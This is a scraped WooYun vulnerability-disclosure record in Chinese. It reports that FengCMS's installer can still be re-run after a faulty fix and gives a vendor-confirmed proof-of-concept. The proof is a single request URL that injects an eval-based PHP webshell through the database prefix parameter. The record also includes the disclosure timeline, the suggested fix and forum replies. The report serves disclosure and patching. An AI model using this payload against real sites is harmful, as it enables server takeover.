{"id": 50830, "wybug_id": "wooyun-2014-076648", "wybug_title": "FengCMS 修复不当导致getshell", "wybug_corp": "fengcms.com", "wybug_author": "xiaoL", "wybug_date": "2014-09-22 10:27", "wybug_open_date": "2014-12-21 10:28", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-27：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-21：\t细节向公众公开  简要描述： FengCMS 修复不当导致getshell，属于修复不当，跟其他的没重复了- -，对审核同学造成的不便深感歉意。 详细说明：  之前提交过一次跟 WooYun: FengCMS新版本重装 漏洞重复了。现在重新看一下。发现修复的有问题，而且install目录默认是不会自动删除的，依然可以getshell！\nheader(\"Content-type:text/html;charset=utf-8\");define(\"TPL_INCLUDE\",1);// 定义当前路径define('ABS_PATH',dirname(__FILE__));define('ROOT_PATH',dirname(ABS_PATH));if(!$_GET['step'])$_GET['step']=1;$config_file=ROOT_PATH.'/config.php';$install_file=ABS_PATH.'/install.sql';//这里是修改添加的代码，由于是输出javascript，所以可以无视掉if(file_exists(ROOT_PATH.'/upload/INSTALL')){  echo '<script type=\"text/javascript\">alert(\"系统已安装，如需要重新安装，请手工删除upload目录下的INSTALL文件！\");</script>';  echo '<meta http-equiv=\"refresh\" content=\"0;url=/\">';}\n所以直接进行setp = 4 的步骤，其中只有DB_PREFIX字段不影响，可以用来getshell。   漏洞证明：  直接访问URL：http://127.0.0.1/install/index.php?host=localhost&user=root&password=root&dbname=hello&prefix=f_');@eval($_POST[101]);('&url_type=1&step=4 \n\n\n\n\n\n   修复方案：  echo 完了exit()一下   版权声明：转载请注明来源 xiaoL@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-09-24 10:42 厂商回复： 非常感谢！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-22 10:53 |    \t\t寂寞的瘦子 \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:53        | 一切语言转汇编理论)\t\t \n  默默支持大神    \n     2014-09-22 10:57 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  默默支持大神    \n     2014-09-22 11:31 |    \t\tchopper \t\t\t( 普通白帽子  |\t\t\t        Rank:144 漏洞数:29        | 菜鸟求学，多多关照~)\t\t \n  默默支持大神    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}